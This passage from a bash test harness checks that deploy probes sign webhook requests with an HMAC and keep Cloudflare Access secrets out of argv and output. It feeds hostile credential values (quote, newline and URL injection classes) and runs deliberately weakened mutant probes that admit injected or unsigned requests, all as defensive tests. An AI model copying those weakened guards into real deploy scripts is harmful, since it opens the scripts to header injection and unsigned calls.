    config-hdr-cf)    { cat "$f"; printf '%s\n' ': -H "CF-Access-Client-Id: x"'; } > "$HM5_MUT" ;;
    config-nodisable) text="$(cat "$f"; printf x)"; text="${text%x}"
              [[ "$text" == *"curl --disable --noproxy '*'"* ]] || fatal "facet mutation config-nodisable did not land in $1"
              printf '%s' "${text//"curl --disable --noproxy '*'"/"curl --noproxy '*'"}" > "$HM5_MUT" ;;
    config-noprintf)  text="$(cat "$f"; printf x)"; text="${text%x}"
              [[ "$text" == *"$HM5_CFG_LIT"* ]] || fatal "facet mutation config-noprintf did not land in $1"
              # the replacement goes through a variable: a process substitution written INSIDE the replacement of ${v//pat/repl} parses on bash 5.3 and
              # is a parse error ("unexpected EOF while looking for matching ')'") on bash 5.2, the userland of the CI runner
              hm5_repl="--config - < <(printf  'header = \"X-Signature-256: sha256=%s\"\\n'"
              printf '%s' "${text//"$HM5_CFG_LIT"/"$hm5_repl"}" > "$HM5_MUT" ;;
    config-twoprintf) { cat "$f"; printf '%s\n' ": $HM5_CFG_LIT"; } > "$HM5_MUT" ;;
    # a second, flag-less curl command next to the disable form (the disable-form count stays 1, so only the exact count of curl commands can see it)
    config-barecurl)  { cat "$f"; printf '%s\n' 'curl -s http://127.0.0.1:9/x'; } > "$HM5_MUT" ;;
    guard)    mapfile -t tl < "$f"
              for i in "${!tl[@]}"; do ln="${tl[i]}"; [[ "$ln" == *'HMAC_KEY="$WEBHOOK_DEPLOY_SECRET" python3'* ]] && tl[i]="${ln% || *}"; done
              printf '%s\n' "${tl[@]}" > "$HM5_MUT" ;;
    preamble) text="$(cat "$f"; printf x)"; text="${text%x}"
              [[ "$text" == *'case "$-" in'* ]] || fatal "facet mutation preamble did not land in $1"
              printf '%s' "${text//'case "$-" in'/'case "$1" in'}" > "$HM5_MUT" ;;
  esac
  cmp -s "$f" "$HM5_MUT" && fatal "facet mutation $2 did not land in $1"
  return 0
}
while IFS= read -r hf; do
  base="$(basename "$hf" .sh)"; hm5_fbad=""
  for hm5_facet in guard openssl config config-hdr-cf config-nodisable config-barecurl config-noprintf config-twoprintf preamble; do
    hm5_facet_mut "$hf" "$hm5_facet"; hm5_audit "$HM5_MUT"
    [[ "$HM5_BAD" == " ${hm5_facet%%-*}" ]] || hm5_fbad+=" [$hm5_facet:${HM5_BAD:-none}]"
  done
  if [[ -z "$hm5_fbad" ]]; then row "mutation ($base): dropping the || VAR=\"\" guard, adding an openssl line, removing the xtrace refusal, and (for the config facet, each conjunct and alternative ALONE) adding an X-Signature -H header, adding a CF-Access -H header, dropping --disable, adding a second bare curl command, dropping the header printf and repeating it each fail exactly their own facet" ok
  else row "mutation ($base): dropping the || VAR=\"\" guard, adding an openssl line, removing the xtrace refusal, and (for the config facet, each conjunct and alternative ALONE) adding an X-Signature -H header, adding a CF-Access -H header, dropping --disable, adding a second bare curl command, dropping the header printf and repeating it each fail exactly their own facet" fail "facets that did not fire alone:$hm5_fbad"; fi
done <<< "$HM5_FILES"

# ---- running the probes under the hmac-cf profile ------------------------------------------------------------
PARBIN="$HMX/parbin"; PYSEL="$HMX/pysel"; PYBAD="$HMX/pybad"; PYGARB="$HMX/pygarb"
for d in "$PARBIN" "$PYSEL" "$PYBAD" "$PYGARB"; do assert_fixture_dir "$d"; mkdir -p "$d"; done
ln -s "$(type -P sha256sum)" "$PARBIN/sha256sum"                        # the parity script hashes ci-deploy.sh; not added to REALBIN
printf '#!%s\nexit 1\n' "$BASH_BIN" > "$PYBAD/python3"                                # python3 that fails
printf '#!%s\nprintf "not-a-digest"\n' "$BASH_BIN" > "$PYGARB/python3"                # python3 that prints a non-digest
printf '#!%s\n[[ "${1:-}" == "-I" ]] && exit 1\nexec "%s" "$@"\n' "$BASH_BIN" "$REAL_PY" > "$PYSEL/python3"   # fails ONLY the HMAC call (-I -c), runs the host-key parse
chmod +x "$PYBAD/python3" "$PYGARB/python3" "$PYSEL/python3"
printf '%s' '{"sandbox_canary":{"verdict":"pass","consecutive_pass":6,"first_pass_at":1700000000,"checked_at":1700345600,"sdk_version":"0.0.0-synthetic"}}' > "$BODIES/canary_pass.json"
printf '%s' '{"workspace_isolation":{"verdict":"pass","consecutive_pass":6,"first_pass_at":1700000000,"checked_at":1700345600}}' > "$BODIES/workspace_isolation_pass.json"
printf '%s' '{"schema_version":2,"start_ts":1700000000,"end_ts":1700000100,"fatal_rc":0}' > "$BODIES/fatal_frame.json"
HMX_ENV=("WEBHOOK_DEPLOY_SECRET=$HMX_KEY" "CF_ACCESS_CLIENT_ID=$HMX_CFID" "CF_ACCESS_CLIENT_SECRET=$HMX_CFSEC"
  "BETTERSTACK_QUERY_HOST=bs.example.test" "BETTERSTACK_QUERY_USERNAME=bsu" "BETTERSTACK_QUERY_PASSWORD=bsp"
  "SHIM_AUTH=hmac-cf" "SHIM_HMAC_KEY=$HMX_KEY" "SHIM_CF_ID=$HMX_CFID" "SHIM_CF_SECRET=$HMX_CFSEC")
HMX_PATH="$HMBIN:$PYDIR:$PARBIN"   # recording python3/openssl (real tool behind them), then the real python3, then sha256sum
# hmx_sandbox <name> <source script> -> prints the path of the copy inside a sandbox repo root that also holds a stub betterstack-query.sh
hmx_sandbox() {
  local sb="$HMX/sb-$1"; assert_fixture_dir "$sb"; mkdir -p "$sb/scripts/followthroughs"
  cp "$2" "$sb/scripts/followthroughs/$(basename "$2")"
  printf '#!%s\nexit 0\n' "$BASH_BIN" > "$sb/scripts/betterstack-query.sh"; chmod +x "$sb/scripts/betterstack-query.sh"
  printf '%s' "$sb/scripts/followthroughs/$(basename "$2")"
}
hmx_run() { # <rowname> <script> [extra NAME=value ...]   (HMX_ENV first, extras after so they win; HMX_RUN_PATH overrides the extra PATH)
  local name="$1" script="$2"; shift 2
  RUN_EXTRA_PATH="${HMX_RUN_PATH-$HMX_PATH}"
  run_probe "$name" "$script" "BK_SHIM=$ROWS/$name/shim" "${HMX_ENV[@]}" "$@"
  RUN_EXTRA_PATH=""
}
# evaluate_hmac <rowdir> <hosts-regex> <min_calls> -> EV_FAILED (space-separated check names, empty = GREEN)
#   headers-not-on-stdin  a call to a manifest host whose stdin is not EXACTLY the three header lines (a 64-hex digest, then the id, then the secret)
#   secret-in-argv        the webhook key, the Cloudflare Access id or secret, or the digest is in any recorded curl argv
#   secret-in-tool-argv   the same markers in any recorded python3/openssl argv, or an openssl -hmac/-macopt operand
#   key-not-in-env        no recorded python3 call carried HMAC_KEY in its environment
#   injected / unexpected-host / unexpected-tool / unmodelled-flag / calls-below-min / secret-in-output / bash-error  (as `evaluate`)
evaluate_hmac() {
  local row="$1" hosts="$2" min="$3" f c h digest m; local -a L
  EV_FAILED=""; EV_HOST_CALLS=0; count_calls "$row"
  for f in "$row"/shim/calls/*.argv; do
    [[ -e "$f" ]] || continue
    c="${f%.argv}"; h=""; digest=""
    [[ -r "$c.host" ]] && h="$(<"$c.host")"
    if [[ "$h" =~ ^(${hosts})$ ]]; then
      EV_HOST_CALLS=$((EV_HOST_CALLS + 1))
      mapfile -t L < <(grep -v '^$' "$c.stdin" 2>/dev/null)
      if [[ "${#L[@]}" == 3 && "${L[0]}" =~ ^header\ =\ \"X-Signature-256:\ sha256=([0-9a-f]{64})\"$ \
            && "${L[1]}" == "header = \"CF-Access-Client-Id: $HMX_CFID\"" && "${L[2]}" == "header = \"CF-Access-Client-Secret: $HMX_CFSEC\"" ]]; then
        digest="${BASH_REMATCH[1]}"
      else EV_FAILED+=" headers-not-on-stdin"; fi
    else EV_FAILED+=" unexpected-host"; fi
    for m in "$HMX_KEY" "$HMX_CFID" "$HMX_CFSEC" ${digest:+"$digest"}; do
      grep -aqF -- "$m" "$f" && EV_FAILED+=" secret-in-argv"
    done
    [[ -s "$c.injected" ]] && EV_FAILED+=" injected"
  done
  for f in "$row"/shim/tools/*.argv; do
    [[ -e "$f" ]] || continue
    for m in "$HMX_KEY" "$HMX_CFID" "$HMX_CFSEC"; do grep -aqF -- "$m" "$f" && EV_FAILED+=" secret-in-tool-argv"; done
    case "${f##*/}" in openssl-*) grep -aqE -e '-hmac|-macopt' "$f" && EV_FAILED+=" secret-in-tool-argv" ;; esac
  done
  if (( min > 0 )) && ! ls "$row"/shim/tools/python3-*.hmackey >/dev/null 2>&1; then EV_FAILED+=" key-not-in-env"; fi
  (( EV_HOST_CALLS < min )) && EV_FAILED+=" calls-below-min"
  [[ -e "$row/shim/unexpected" ]] && EV_FAILED+=" unexpected-tool"
  [[ -e "$row/shim/unmodelled" ]] && EV_FAILED+=" unmodelled-flag"
  for m in "$HMX_KEY" "$HMX_CFID" "$HMX_CFSEC"; do grep -aqF -- "$m" "$row/stdout" "$row/stderr" 2>/dev/null && EV_FAILED+=" secret-in-output"; done
  grep -aqE ': line [0-9]+: ' "$row/stderr" 2>/dev/null && EV_FAILED+=" bash-error"
  EV_FAILED="$(printf '%s\n' $EV_FAILED | awk '!s[$0]++' | paste -sd' ' -)"
  return 0
}
# hmx_refused <rowdir> <rc-want> <script-name> -> HMX_BAD: zero calls, the rc, the value-free marker exactly once, the surface's own line, nothing echoed
hmx_refused() {
  local row="$1" want_rc="$2" sname="$3"
  HMX_BAD=""
  [[ "$RUN_RC" -eq "$want_rc" ]] || HMX_BAD+=" rc=$RUN_RC"
  count_calls "$row"; [[ "$EV_CALLS" -eq 0 ]] || HMX_BAD+=" curl-called"
  [[ "$(grep -cxF -- "SOLEUR_CREDENTIAL_REFUSED script=$sname reason=token_shape" "$row/stderr" || true)" == 1 ]] || HMX_BAD+=" marker-line"
  [[ "$(grep -cF -- 'SOLEUR_CREDENTIAL_REFUSED' "$row/stderr" "$row/stdout" | awk -F: '{n+=$NF} END {print n+0}')" == 1 ]] || HMX_BAD+=" marker-count"
  if grep -aqE 'SYNTHMARK000|'"$HMX_KEY"'|'"$HMX_CFID"'|'"$HMX_CFSEC" "$row/stdout" "$row/stderr" 2>/dev/null; then HMX_BAD+=" value-in-output"; fi
  [[ ! -e "$row/shim/unexpected" && ! -e "$row/shim/unmodelled" ]] || HMX_BAD+=" stub-called"
  grep -aqE ': line [0-9]+: ' "$row/stderr" 2>/dev/null && HMX_BAD+=" bash-error"
  return 0
}
# hmx_classes: the hostile CF value classes (a quoted config line is broken by a quote, a newline, a second directive; the class also refuses space and non-ASCII)
HMX_CLASSES="$TOK_CLASSES"
class_floor "$HMX_CLASSES" || { printf '[FATAL] HMX_CLASSES lost a required class or repeats one: %s\n' "$HMX_CLASSES" >&2; exit 2; }

HMX_ENV_SAVED=()
hmx_env_without() { local e; HMX_ENV_SAVED=("${HMX_ENV[@]}"); HMX_ENV=(); for e in "${HMX_ENV_SAVED[@]}"; do [[ "$e" == "$1="* ]] || HMX_ENV+=("$e"); done; }
hmx_env_restore() { HMX_ENV=("${HMX_ENV_SAVED[@]}"); }

# probe_rows_hmac <name> <hosts> <min> <body> <refusal rc> <PASS regex>
probe_rows_hmac() {
  local name="$1" hosts="$2" min="$3" body="$4" refrc="$5" okre="$6"
  local src="$REPO_ROOT/scripts/followthroughs/$name.sh" script cls v rc bad
  N_DYN=$((N_DYN + 1))
  [[ -f "$src" ]] || { row "$name: manifest entry names an existing probe" fail "missing"; return 0; }
  script="$(hmx_sandbox "$name" "$src")"
  local -a bodyenv=("SHIM_BODY_FILE=$BODIES/$body.json")

  # A. the full contract: the success outcome is reachable ONLY through the recomputed digest and the exact Cloudflare Access pair
  hmx_run "$name-A" "$script" "${bodyenv[@]}"; rc=$RUN_RC; evaluate_hmac "$RUN_ROW" "$hosts" "$min"
  if [[ "$rc" -eq 0 && -z "$EV_FAILED" ]] && grep -qE -e "$okre" "$RUN_ROW/stdout"; then
    row "$name: full contract (the shim recomputes the digest and accepts it; exactly the three header lines on stdin; key, id, secret and digest in no argv; HMAC_KEY in python3's environment only)" ok
  else row "$name: full contract (the shim recomputes the digest and accepts it; exactly the three header lines on stdin; key, id, secret and digest in no argv; HMAC_KEY in python3's environment only)" fail "rc=$rc calls=$EV_HOST_CALLS failed='$EV_FAILED'"; fi
  # A2. must-PASS, not the canonical: a key holding a quote, a newline, a dollar and a backslash still signs correctly (the key has no shape guard)
  v=$'wh"key\n$x\\y-'"$HMX_RAND"
  hmx_run "$name-A2" "$script" "${bodyenv[@]}" "WEBHOOK_DEPLOY_SECRET=$v" "SHIM_HMAC_KEY=$v"; rc=$RUN_RC
  # (the call count is a conjunct: a negated grep over a glob that matches no file is vacuously true)
  if [[ "$rc" -eq 0 ]] && grep -qE -e "$okre" "$RUN_ROW/stdout" && [[ "$(bk_calls "$RUN_ROW")" -ge 1 ]] && ! grep -aqF -- "$HMX_RAND" "$RUN_ROW"/shim/calls/*.argv; then
    row "$name: a webhook key holding a quote, a newline, a dollar and a backslash signs correctly (the shim's recomputed digest agrees) and reaches no argv" ok
  else row "$name: a webhook key holding a quote, a newline, a dollar and a backslash signs correctly (the shim's recomputed digest agrees) and reaches no argv" fail "rc=$rc"; fi
  # B. a 401 never reaches the success outcome
  hmx_run "$name-B" "$script" "${bodyenv[@]}" SHIM_MODE=deny; rc=$RUN_RC
  if [[ "$rc" -ne 0 ]] && ! grep -qE -e "$okre" "$RUN_ROW/stdout" && [[ ! -e "$RUN_ROW/shim/unexpected" && ! -e "$RUN_ROW/shim/unmodelled" ]]; then
    row "$name: a 401 never reaches the success outcome" ok
  else row "$name: a 401 never reaches the success outcome" fail "rc=$rc"; fi
  # B2. the digest check is real: a probe signing with a different key than the shim's, and a hard-coded 64-zero digest, are both 401
  hmx_run "$name-B2key" "$script" "${bodyenv[@]}" "SHIM_HMAC_KEY=other-$HMX_RAND"; rc=$RUN_RC
  bad=""; [[ "$rc" -ne 0 ]] && ! grep -qE -e "$okre" "$RUN_ROW/stdout" || bad+=" wrong-key-reached-success"
  hm5_mut "scripts/followthroughs/$name.sh" zero "$HM_CANON_DEPLOY" "printf '%064d' 0"
  local zsrc; zsrc="$(hmx_sandbox "$name-zero" "$HM5_MUT")"
  hmx_run "$name-B2zero" "$zsrc" "${bodyenv[@]}"; rc=$RUN_RC
  [[ "$rc" -ne 0 ]] && ! grep -qE -e "$okre" "$RUN_ROW/stdout" && [[ "$(bk_calls "$RUN_ROW")" -ge 1 ]] || bad+=" zero-digest-reached-success"
  if [[ -z "$bad" ]]; then row "$name: a signing key different from the shim's, and a hard-coded 64-zero digest (a mutant that still sends a call), are both 401 and never reach the success outcome" ok
  else row "$name: a signing key different from the shim's, and a hard-coded 64-zero digest (a mutant that still sends a call), are both 401 and never reach the success outcome" fail "$bad"; fi
  # C. the signature header stripped by a mutated COPY of the real probe
  hm5_mut "scripts/followthroughs/$name.sh" strip 'header = "X-Signature-256: sha256=%s"' 'header = "X-Stripped: sha256=%s"'
  local csrc; csrc="$(hmx_sandbox "$name-strip" "$HM5_MUT")"
  hmx_run "$name-C" "$csrc" "${bodyenv[@]}"; rc=$RUN_RC
  if [[ "$rc" -ne 0 ]] && ! grep -qE -e "$okre" "$RUN_ROW/stdout"; then row "$name: a header-stripped copy never reaches the success outcome" ok
  else row "$name: a header-stripped copy never reaches the success outcome" fail "rc=$rc"; fi
  # D. each credential unset or empty: zero calls, the non-verdict outcome (rc 2, TRANSIENT), no bash error
  bad=""
  for v in WEBHOOK_DEPLOY_SECRET CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET; do
    hmx_run "$name-D-$v-empty" "$script" "${bodyenv[@]}" "$v="; rc=$RUN_RC; count_calls "$RUN_ROW"
    [[ "$EV_CALLS" -eq 0 ]] && transient_outcome "$RUN_ROW" "$rc" || bad+=" [$v empty: rc=$rc calls=$EV_CALLS]"
    hmx_env_without "$v"
    hmx_run "$name-D-$v-unset" "$script" "${bodyenv[@]}"; rc=$RUN_RC; count_calls "$RUN_ROW"
    hmx_env_restore
    [[ "$EV_CALLS" -eq 0 ]] && transient_outcome "$RUN_ROW" "$rc" || bad+=" [$v unset: rc=$rc calls=$EV_CALLS]"
  done
  if [[ -z "$bad" ]]; then row "$name: each of the three credentials unset or empty produces zero calls and a TRANSIENT rc 2" ok
  else row "$name: each of the three credentials unset or empty produces zero calls and a TRANSIENT rc 2" fail "$bad"; fi
  # E1. hostile Cloudflare Access values: refused BEFORE curl (zero calls), the marker once, the value not echoed, rc $refrc
  bad=""; e1_n=0
  for v in CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET; do
    for cls in $HMX_CLASSES; do
      e1_n=$((e1_n + 1))
      hmx_run "$name-E1-$v-$cls" "$script" "${bodyenv[@]}" "$v=$(tok_for "$cls")"; hmx_refused "$RUN_ROW" "$refrc" "$name"
      [[ -z "$HMX_BAD" ]] || bad+=" [$v $cls:$HMX_BAD]"
    done
  done
  # a zero-iteration loop must fail: an empty class list emitted `ok` over no run at all
  [[ "$e1_n" -ge 1 && "$e1_n" -eq $((2 * $(wc -w <<< "$HMX_CLASSES"))) ]] || bad+=" [E1 ran $e1_n iterations]"
  if [[ -z "$bad" ]]; then row "$name: hostile Cloudflare Access values (quote+newline+url, newline, non-ASCII, quote, space, backslash, tab, CR) in the id and in the secret: zero calls, rc $refrc, the marker once, nothing echoed" ok
  else row "$name: hostile Cloudflare Access values (quote+newline+url, newline, non-ASCII, quote, space, backslash, tab, CR) in the id and in the secret: zero calls, rc $refrc, the marker once, nothing echoed" fail "$bad"; fi
  # E1b. an unusable signature (python3 fails, prints a non-digest, or is absent) is refused BEFORE curl, not sent unsigned
  bad=""
  for cls in bad garbage absent; do
    case "$cls" in bad) HMX_RUN_PATH="$PYBAD:$PYDIR" ;; garbage) HMX_RUN_PATH="$PYGARB:$PYDIR" ;; absent) HMX_RUN_PATH="$PARBIN" ;; esac
    hmx_run "$name-E1b-$cls" "$script" "${bodyenv[@]}"; hmx_refused "$RUN_ROW" "$refrc" "$name"
    [[ -z "$HMX_BAD" ]] || bad+=" [python3 $cls:$HMX_BAD]"
  done
  unset HMX_RUN_PATH
  if [[ -z "$bad" ]]; then row "$name: python3 failing, printing a non-digest or missing is refused before curl (zero calls, rc $refrc, the marker once), never an unsigned request" ok
  else row "$name: python3 failing, printing a non-digest or missing is refused before curl (zero calls, rc $refrc, the marker once), never an unsigned request" fail "$bad"; fi
  # E2. xtrace refusal (both forms) with each credential set alone: rc 78, zero calls, nothing on output
  for mode in env flag; do
    bad=""
    for v in WEBHOOK_DEPLOY_SECRET CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET; do
      if xtrace_check "$script" "$v" "$name-E2-$v-$mode" "$mode"; then :; else bad+=" [$v: $XT_DETAIL]"; fi
    done
    if [[ -z "$bad" ]]; then row "$name: refuses xtrace ($mode form) with each of the three credentials set: rc 78, zero calls, no token on output" ok
    else row "$name: refuses xtrace ($mode form) with each of the three credentials set: rc 78, zero calls, no token on output" fail "$bad"; fi
  done
  # E4. a 100,000-byte (class-clean) Cloudflare Access secret with a never-reading shim under pipefail: the process-substitution writer dies silently
  hmx_run "$name-E4" "$script" "${bodyenv[@]}" SHIM_MODE=noread "CF_ACCESS_CLIENT_SECRET=$BIGTOK"; rc=$RUN_RC
  if [[ "$rc" -eq 0 ]] && grep -qE -e "$okre" "$RUN_ROW/stdout" && [[ "$(bk_calls "$RUN_ROW")" -ge 1 ]] && ! grep -aqi 'broken pipe' "$RUN_ROW/stderr"; then
    row "$name: a 100,000-byte Cloudflare Access secret with a never-reading shim under pipefail: rc 0, a recorded call, no broken pipe" ok
  else row "$name: a 100,000-byte Cloudflare Access secret with a never-reading shim under pipefail: rc 0, a recorded call, no broken pipe" fail "rc=$rc"; fi
  # E5/E6. harness mutations against the real converted probe
  hmx_run "$name-E5" "$script" "${bodyenv[@]}" SHIM_MUTATE=nostdin; evaluate_hmac "$RUN_ROW" "$hosts" "$min"
  if [[ " $EV_FAILED " == *" headers-not-on-stdin "* ]]; then row "$name: a shim that stops recording stdin turns the full-contract row RED (headers-not-on-stdin)" ok
  else row "$name: a shim that stops recording stdin turns the full-contract row RED (headers-not-on-stdin)" fail "failed='$EV_FAILED'"; fi
  hmx_run "$name-E6" "$csrc" "${bodyenv[@]}" SHIM_MUTATE=noauth; rc=$RUN_RC
  if [[ "$rc" -eq 0 ]] && grep -qE -e "$okre" "$RUN_ROW/stdout"; then row "$name: a shim that stops being auth-gated lets the stripped copy reach the success outcome, and the check sees it" ok
  else row "$name: a shim that stops being auth-gated lets the stripped copy reach the success outcome, and the check sees it" fail "stripped copy still not reaching success (rc=$rc)"; fi
  # M. per-script mutants of the real probe, run: the guards must be what stops the request
  hm5_mut "scripts/followthroughs/$name.sh" bearer '*[!A-Za-z0-9._~+/=-]*) return 1' '*[!A-Za-z0-9._~+/=\"-]*) return 1'
  local msrc; msrc="$(hmx_sandbox "$name-mbearer" "$HM5_MUT")"
  hmx_run "$name-Mbearer" "$msrc" "${bodyenv[@]}" "CF_ACCESS_CLIENT_SECRET=$(tok_for quote)"; evaluate_hmac "$RUN_ROW" "$hosts" 0
  if [[ "$(bk_calls "$RUN_ROW")" -ge 1 && " $EV_FAILED " == *" injected "* ]]; then row "$name: mutant admitting the double quote in _bearer_ok sends the hostile secret and the shim records INJECTED (the E1 row goes RED)" ok
  else row "$name: mutant admitting the double quote in _bearer_ok sends the hostile secret and the shim records INJECTED (the E1 row goes RED)" fail "calls=$(bk_calls "$RUN_ROW") failed='$EV_FAILED'"; fi
  hm5_mut "scripts/followthroughs/$name.sh" nohex '^[0-9a-f]{64}$' '^[0-9a-f]*$'
  msrc="$(hmx_sandbox "$name-mnohex" "$HM5_MUT")"
  HMX_RUN_PATH="$PYBAD:$PYDIR"; hmx_run "$name-Mnohex" "$msrc" "${bodyenv[@]}"; unset HMX_RUN_PATH
  if [[ "$(bk_calls "$RUN_ROW")" -ge 1 ]]; then row "$name: mutant weakening the 64-hex check sends an UNSIGNED request when python3 fails (the E1b row goes RED)" ok
  else row "$name: mutant weakening the 64-hex check sends an UNSIGNED request when python3 fails (the E1b row goes RED)" fail "calls=$(bk_calls "$RUN_ROW")"; fi
}

while IFS='|' read -r h_name h_kind h_hosts h_min h_body h_test; do
  [[ -n "$h_name" ]] || continue
  case "$h_kind" in
    dynamic)
      refrc=2; okre='^PASS'
      probe_rows_hmac "$h_name" "$h_hosts" "$h_min" "$h_body" "$refrc" "$okre" ;;
    delegated)
      # The delegation row is NOT "the suite names the probe": the suite must RECORD the curl stdin and assert the exact three header lines
      # (the id and secret values and a 64-hex signature), so a delegated probe cannot pass while sending no credential. A mutant copy of the
      # suite without those assertions must turn the same check RED.
      N_DELEGATED=$((N_DELEGATED + 1))
      hmx_del() { # <test file> -> 0 when it records stdin and asserts the three lines + a 64-hex digest + the refusal marker
        local t="$1" code
        code="$(grep -vE '^[[:space:]]*#' "$t")"
        [[ "$(grep -cF -e 'header = "X-Signature-256: sha256=' <<< "$code" || true)" -ge 1 && "$(grep -cF -e 'header = "CF-Access-Client-Id: ' <<< "$code" || true)" -ge 1 \
           && "$(grep -cF -e 'header = "CF-Access-Client-Secret: ' <<< "$code" || true)" -ge 1 && "$(grep -cF -e '[0-9a-f]{64}' <<< "$code" || true)" -ge 1 \
           && "$(grep -cF -e 'SOLEUR_CREDENTIAL_REFUSED script=' <<< "$code" || true)" -ge 1 && "$(grep -cE -e 'curl[._-]stdin|stdin[._-](log|rec)' <<< "$code" || true)" -ge 1 ]]
      }
      if [[ -f "$h_test" ]] && git ls-files --error-unmatch -- "$h_test" >/dev/null 2>&1 && grep -qF -- "$h_name" "$h_test" && hmx_del "$h_test"; then
        row "delegated $h_name (HMAC): owning test $h_test is tracked, names the probe, RECORDS curl's stdin and asserts the three header lines, a 64-hex digest and the refusal marker" ok
      else row "delegated $h_name (HMAC): owning test $h_test is tracked, names the probe, RECORDS curl's stdin and asserts the three header lines, a 64-hex digest and the refusal marker" fail "missing, untracked, or it does not assert recorded stdin"; fi
      if [[ -f "$h_test" ]]; then
        grep -vF -e 'header = "CF-Access-Client-Secret: ' "$h_test" > "$HMX/del-mut-$h_name.sh" || true
        if ! hmx_del "$HMX/del-mut-$h_name.sh"; then row "delegated $h_name (HMAC): a copy of the owning test without its CF-Access-Client-Secret stdin assertion fails the delegation check (it can fire)" ok
        else row "delegated $h_name (HMAC): a copy of the owning test without its CF-Access-Client-Secret stdin assertion fails the delegation check (it can fire)" fail "the check accepted a suite that no longer asserts the secret header on stdin"; fi
      else row "delegated $h_name (HMAC): a copy of the owning test without its CF-Access-Client-Secret stdin assertion fails the delegation check (it can fire)" fail "no owning test"; fi ;;
    *) row "HMAC manifest $h_name: known kind" fail "unknown kind '$h_kind'" ;;
  esac
done <<< "$HMAC_MANIFEST"

# ---- the parity script's LIVE status arm (its owning suite reads fixtures; this is the only row that reaches the transport) ----
PAR="scripts/check-deploy-script-parity.sh"
PAR_SHA="$(sha256sum apps/web-platform/infra/ci-deploy.sh | cut -d' ' -f1)"
printf '{"ci_deploy_sha256":"%s","host_id":"hetzner-1"}' "$PAR_SHA" > "$BODIES/parity_status.json"
par_run() { # <rowname> [extra NAME=value ...]  (script: the real one, at its repo location, --status-only)
  local name="$1"; shift
  RUN_ARGS=(--status-only); RUN_EXTRA_PATH="${HMX_RUN_PATH-$HMX_PATH}"
  run_probe "$name" "${PAR_SCRIPT:-$REPO_ROOT/$PAR}" "BK_SHIM=$ROWS/$name/shim" "${HMX_ENV[@]}" "SHIM_BODY_FILE=$BODIES/parity_status.json" "$@"
  RUN_ARGS=(); RUN_EXTRA_PATH=""
}
par_run par-A; rc=$RUN_RC; evaluate_hmac "$RUN_ROW" 'deploy\.soleur\.ai' 1
if [[ "$rc" -eq 0 && -z "$EV_FAILED" ]] && grep -qF 'PARITY(status)' "$RUN_ROW/stdout"; then
  row "check-deploy-script-parity (live status arm): the shim recomputes the digest and accepts it; exactly the three header lines on stdin; key, id, secret and digest in no argv" ok
else row "check-deploy-script-parity (live status arm): the shim recomputes the digest and accepts it; exactly the three header lines on stdin; key, id, secret and digest in no argv" fail "rc=$rc failed='$EV_FAILED'"; fi
v=$'wh"key\n$x\\y-'"$HMX_RAND"
par_run par-A2 "WEBHOOK_DEPLOY_SECRET=$v" "SHIM_HMAC_KEY=$v"; rc=$RUN_RC
if [[ "$rc" -eq 0 ]] && grep -qF 'PARITY(status)' "$RUN_ROW/stdout"; then row "check-deploy-script-parity: a webhook key holding a quote, a newline, a dollar and a backslash signs correctly" ok
else row "check-deploy-script-parity: a webhook key holding a quote, a newline, a dollar and a backslash signs correctly" fail "rc=$rc"; fi
par_run par-B SHIM_MODE=deny; rc=$RUN_RC
if [[ "$rc" -eq 1 ]] && grep -qF 'DRIFT(status)' "$RUN_ROW/stderr" && ! grep -qF 'PARITY(status)' "$RUN_ROW/stdout"; then row "check-deploy-script-parity: a 401 is DRIFT(status), never PARITY" ok
else row "check-deploy-script-parity: a 401 is DRIFT(status), never PARITY" fail "rc=$rc"; fi
par_run par-B2 "SHIM_HMAC_KEY=other-$HMX_RAND"; rc=$RUN_RC
if [[ "$rc" -eq 1 ]] && ! grep -qF 'PARITY(status)' "$RUN_ROW/stdout"; then row "check-deploy-script-parity: a signing key different from the shim's is 401, DRIFT(status), never PARITY (the digest check is real)" ok
else row "check-deploy-script-parity: a signing key different from the shim's is 401, DRIFT(status), never PARITY (the digest check is real)" fail "rc=$rc"; fi
bad=""; e1_n=0
for v in CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET; do
  for cls in $HMX_CLASSES; do
    e1_n=$((e1_n + 1))
    par_run "par-E1-$v-$cls" "$v=$(tok_for "$cls")"; hmx_refused "$RUN_ROW" 2 check-deploy-script-parity
    [[ -z "$HMX_BAD" ]] || bad+=" [$v $cls:$HMX_BAD]"
  done
done
[[ "$e1_n" -ge 1 && "$e1_n" -eq $((2 * $(wc -w <<< "$HMX_CLASSES"))) ]] || bad+=" [E1 ran $e1_n iterations]"
if [[ -z "$bad" ]]; then row "check-deploy-script-parity: hostile Cloudflare Access values in the id and in the secret: zero calls, exit 2, the marker once, nothing echoed" ok
else row "check-deploy-script-parity: hostile Cloudflare Access values in the id and in the secret: zero calls, exit 2, the marker once, nothing echoed" fail "$bad"; fi
bad=""
# the parity script's host-key parse also needs a working python3, so both shims fail ONLY the HMAC call (-I -c) and pass the rest through
printf '#!%s\n[[ "${1:-}" == "-I" ]] && { printf "not-a-digest"; exit 0; }\nexec "%s" "$@"\n' "$BASH_BIN" "$REAL_PY" > "$PYGARB/python3"
for cls in bad garbage; do
  case "$cls" in bad) HMX_RUN_PATH="$PYSEL:$PARBIN" ;; garbage) HMX_RUN_PATH="$PYGARB:$PARBIN" ;; esac
  par_run "par-E1b-$cls"; hmx_refused "$RUN_ROW" 2 check-deploy-script-parity
  [[ -z "$HMX_BAD" ]] || bad+=" [python3 $cls:$HMX_BAD]"
done
unset HMX_RUN_PATH
if [[ -z "$bad" ]]; then row "check-deploy-script-parity: a failing or non-digest HMAC python3 is refused before curl (zero calls, exit 2, the marker once), never an unsigned request" ok
else row "check-deploy-script-parity: a failing or non-digest HMAC python3 is refused before curl (zero calls, exit 2, the marker once), never an unsigned request" fail "$bad"; fi
bad=""
for mode in env flag; do
  for v in WEBHOOK_DEPLOY_SECRET CF_ACCESS_CLIENT_SECRET; do
    if [[ "$mode" == env ]]; then RUN_ARGS=(--status-only); RUN_EXTRA_PATH="$HMX_PATH"; run_probe "par-xt-$v-$mode" "$REPO_ROOT/$PAR" "$v=$FIXTURE_TOKEN" SHELLOPTS=xtrace
    else RUN_ARGS=(--status-only); RUN_FLAGS=(-x); RUN_EXTRA_PATH="$HMX_PATH"; run_probe "par-xt-$v-$mode" "$REPO_ROOT/$PAR" "$v=$FIXTURE_TOKEN"; RUN_FLAGS=(); fi
    RUN_ARGS=(); RUN_EXTRA_PATH=""; count_calls "$RUN_ROW"
